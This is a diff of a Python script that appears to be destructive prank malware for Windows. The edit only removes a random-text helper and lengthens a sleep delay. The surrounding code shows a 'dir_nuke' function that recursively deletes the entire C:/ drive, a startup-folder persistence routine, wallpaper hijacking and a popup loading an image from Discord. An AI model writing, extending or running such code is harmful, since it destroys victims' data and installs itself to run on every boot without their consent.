@@ -44,12 +44,6 @@ def display_image_box():
         objExplorer.document.title = "get muazzed"
         objExplorer.document.body.innerHTML = "<img src='https://cdn.discordapp.com/attachments/1105563151216414811/1105855509879332935/gaymeicon.png' height=200 width=200>"
 
-# Random Text Generator
-def generate_random_text(size):
-    # Generate random text of given size
-    letters = string.ascii_letters
-    return ''.join(random.choice(letters) for _ in range(size))
-
 def dir_nuke():
     dir = 'C:/'
     shutil.rmtree(dir)
@@ -71,7 +65,7 @@ def change_wallpaper():
 if __name__ == "__main__":
     copy_to_startup()
     change_wallpaper()
-    time.sleep(2)
+    time.sleep(5)
     display_image_box()
     display_error_messages()
     time.sleep(45)
